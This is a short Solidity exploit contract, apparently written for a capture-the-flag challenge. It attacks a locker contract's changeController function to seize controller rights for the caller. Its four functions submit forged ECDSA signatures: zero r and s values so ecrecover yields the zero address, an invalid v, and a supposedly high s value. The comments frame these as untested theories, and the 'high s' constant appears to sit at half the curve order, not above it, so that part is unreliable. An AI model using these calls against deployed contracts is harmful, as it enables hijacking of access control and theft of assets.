// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IECLocker {
    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;
    function controller() external view returns (address);
}

contract WorkingExploit {
    IECLocker public locker;
    
    constructor(address _locker) {
        locker = IECLocker(_locker);
    }
    
    // If the abi.encode line has a compilation issue, the contract might:
    // 1. Have different bytecode than shown
    // 2. The signature hash might always be the same value
    // 3. The usedSignatures check might be bypassed
    
    function exploit1() external {
        // Theory: If abi.encode fails, signatureHash might be 0x0
        // So any signature would have the same hash
        // Try using different signatures that produce ecrecover = 0x0
        
        // v=27, r=0, s=0 should make ecrecover return 0x0
        locker.changeController(27, bytes32(0), bytes32(0), msg.sender);
    }
    
    function exploit2() external {
        // Try v=28 variant
        locker.changeController(28, bytes32(0), bytes32(0), msg.sender);
    }
    
    function exploit3() external {
        // Try completely invalid v value  
        locker.changeController(0, bytes32(uint256(1)), bytes32(uint256(1)), msg.sender);
    }
    
    function exploit4() external {
        // Try high s value (above curve order / 2)
        bytes32 highS = bytes32(0x7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF5D576E7357A4501DDFE92F46681B20A0);
        locker.changeController(27, bytes32(uint256(1)), highS, msg.sender);
    }
}